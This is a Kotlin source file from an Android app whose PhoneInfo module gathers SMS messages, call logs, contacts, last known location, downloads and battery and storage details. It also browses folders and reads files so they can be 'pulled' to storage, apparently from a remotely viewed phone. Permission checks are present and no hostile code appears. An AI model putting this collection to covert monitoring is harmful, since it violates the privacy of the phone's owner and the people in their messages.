package com.shivtej.aj

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import java.io.File
import java.util.Calendar
import java.util.Locale

data class SmsInfo(val from: String, val body: String, val time: Long)
data class CallsInfo(val missed: List<String>, val incoming: Int, val outgoing: Int, val missedCount: Int)
data class StorageInfo(val totalGb: Double, val freeGb: Double)
data class BatteryInfo(val percent: Int, val charging: Boolean)

/** फ़ोन से जानकारी निकालना: मैसेज, कॉल, स्टोरेज, बैटरी, downloads, contacts */
object PhoneInfo {

    fun has(ctx: Context, permission: String): Boolean =
        ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED

    fun startOfToday(): Long = Calendar.getInstance().apply {
        set(Calendar.HOUR_OF_DAY, 0)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.timeInMillis

    // ---------------- स्टोरेज ----------------

    fun storage(): StorageInfo {
        val stat = StatFs(Environment.getDataDirectory().path)
        val gb = 1024.0 * 1024.0 * 1024.0
        return StorageInfo(stat.totalBytes / gb, stat.availableBytes / gb)
    }

    fun gb(value: Double): String = String.format(Locale.US, "%.1f", value)

    // ---------------- बैटरी ----------------

    fun battery(ctx: Context): BatteryInfo {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val percent = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val status = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        return BatteryInfo(percent, charging)
    }

    // ---------------- SMS ----------------

    /** आज के SMS (नए पहले)। Permission न हो तो null */
    fun todaySms(ctx: Context): List<SmsInfo>? {
        if (!has(ctx, Manifest.permission.READ_SMS)) return null
        val out = ArrayList<SmsInfo>()
        try {
            ctx.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                "${Telephony.Sms.DATE} >= ?",
                arrayOf(startOfToday().toString()),
                "${Telephony.Sms.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext()) {
                    val address = c.getString(0) ?: ""
                    val body = c.getString(1) ?: ""
                    val time = c.getLong(2)
                    out.add(SmsInfo(contactName(ctx, address) ?: address, body, time))
                }
            }
        } catch (e: Exception) {
            return null
        }
        return out
    }

    /** हाल के SMS (नए पहले), सिर्फ़ count/date limit नहीं — पूरी inbox से N */
    fun recentSms(ctx: Context, limit: Int = 100): List<SmsInfo>? {
        if (!has(ctx, Manifest.permission.READ_SMS)) return null
        val out = ArrayList<SmsInfo>()
        try {
            ctx.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext() && out.size < limit) {
                    val address = c.getString(0) ?: ""
                    val type = c.getInt(3)
                    val dir = if (type == Telephony.Sms.MESSAGE_TYPE_SENT) "→ " else ""
                    out.add(SmsInfo((contactName(ctx, address) ?: address).let { dir + it }, c.getString(1) ?: "", c.getLong(2)))
                }
            }
        } catch (e: Exception) {
            return null
        }
        return out
    }

    data class CallRow(val name: String, val number: String, val type: String, val time: Long, val durationSec: Int)

    /** हाल की कॉल लिस्ट (नई पहले) */
    fun recentCalls(ctx: Context, limit: Int = 100): List<CallRow>? {
        if (!has(ctx, Manifest.permission.READ_CALL_LOG)) return null
        val out = ArrayList<CallRow>()
        try {
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext() && out.size < limit) {
                    val number = c.getString(0) ?: ""
                    val type = when (c.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "in"
                        CallLog.Calls.OUTGOING_TYPE -> "out"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "other"
                    }
                    val cached = c.getString(2)
                    val name = if (!cached.isNullOrBlank()) cached else (contactName(ctx, number) ?: number)
                    out.add(CallRow(name, number, type, c.getLong(3), c.getInt(4)))
                }
            }
        } catch (e: Exception) {
            return null
        }
        return out
    }

    // ---------------- Folder browsing (All files) ----------------

    private fun safeName(n: String) = n.replace(Regex("[^A-Za-z0-9._-]"), "_").take(80)

    /** किसी folder के अंदर sub-folder और files (path खाली हो तो internal storage की जड़) */
    fun listDir(ctx: Context, path: String): org.json.JSONObject {
        val res = org.json.JSONObject()
        if (!canReadAllFiles(ctx)) return res.put("ok", false).put("error", "Turn on 'All files' permission on that phone")
        return try {
            val base = Environment.getExternalStorageDirectory()
            val dir = if (path.isBlank()) base else File(path)
            if (!dir.exists() || !dir.isDirectory) return res.put("ok", false).put("error", "Folder not found")
            val dirs = org.json.JSONArray()
            val files = org.json.JSONArray()
            val entries = dir.listFiles() ?: emptyArray()
            entries.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })).forEach { f ->
                if (f.name.startsWith(".")) return@forEach
                if (f.isDirectory) {
                    dirs.put(org.json.JSONObject().put("name", f.name).put("path", f.absolutePath))
                } else {
                    files.put(
                        org.json.JSONObject().put("name", f.name).put("path", f.absolutePath)
                            .put("size", f.length()).put("mtime", f.lastModified())
                    )
                }
            }
            res.put("ok", true).put("path", dir.absolutePath)
                .put("parent", if (dir.absolutePath == base.absolutePath) "" else (dir.parentFile?.absolutePath ?: ""))
                .put("dirs", dirs).put("files", files)
        } catch (e: Exception) {
            res.put("ok", false).put("error", "Could not read folder")
        }
    }

    /** एक file को storage में upload करने लायक bytes + नाम (बड़ी file मना) */
    fun readFileForPull(path: String): Pair<String, ByteArray>? {
        return try {
            val f = File(path)
            if (!f.exists() || !f.isFile) return null
            if (f.length() > 60L * 1024 * 1024) return null
            Pair(safeName(f.name), f.readBytes())
        } catch (e: Exception) {
            null
        }
    }

    // ---------------- कॉल ----------------

    fun todayCalls(ctx: Context): CallsInfo? {
        if (!has(ctx, Manifest.permission.READ_CALL_LOG)) return null
        val missed = ArrayList<String>()
        var incoming = 0
        var outgoing = 0
        try {
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME),
                "${CallLog.Calls.DATE} >= ?",
                arrayOf(startOfToday().toString()),
                "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                while (c.moveToNext()) {
                    val number = c.getString(0) ?: ""
                    val type = c.getInt(1)
                    val cached = c.getString(2)
                    val name = if (!cached.isNullOrBlank()) cached else (contactName(ctx, number) ?: number)
                    when (type) {
                        CallLog.Calls.MISSED_TYPE, CallLog.Calls.REJECTED_TYPE -> missed.add(name)
                        CallLog.Calls.INCOMING_TYPE -> incoming++
                        CallLog.Calls.OUTGOING_TYPE -> outgoing++
                    }
                }
            }
        } catch (e: Exception) {
            return null
        }
        return CallsInfo(missed, incoming, outgoing, missed.size)
    }

    // ---------------- Downloads ----------------

    fun canReadAllFiles(ctx: Context): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager()
        else has(ctx, Manifest.permission.READ_EXTERNAL_STORAGE)

    /** आज Download folder में आई फाइलें। Permission न हो तो null */
    fun todayDownloads(ctx: Context): List<File>? {
        if (!canReadAllFiles(ctx)) return null
        return try {
            val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val start = startOfToday()
            (dir.listFiles() ?: emptyArray())
                .filter { it.isFile && it.lastModified() >= start && !it.name.startsWith(".") }
                .sortedByDescending { it.lastModified() }
        } catch (e: Exception) {
            null
        }
    }

    // ---------------- Location ----------------

    /** फ़ोन कहाँ है: (lat, lon, कितने मिनट पुरानी) या null */
    fun lastLocation(ctx: Context): Triple<Double, Double, Long>? {
        val fine = has(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarse = has(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
        if (!fine && !coarse) return null
        return try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            var best: android.location.Location? = null
            for (p in lm.getProviders(true)) {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best!!.time) best = l
            }
            best?.let {
                val ageMin = (System.currentTimeMillis() - it.time) / 60000
                Triple(it.latitude, it.longitude, ageMin)
            }
        } catch (e: Exception) {
            null
        }
    }

    // ---------------- Contacts ----------------

    fun contactName(ctx: Context, number: String): String? {
        if (number.isBlank() || !has(ctx, Manifest.permission.READ_CONTACTS)) return null
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
            ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
                ?.use { c -> if (c.moveToFirst()) c.getString(0) else null }
        } catch (e: Exception) {
            null
        }
    }
}
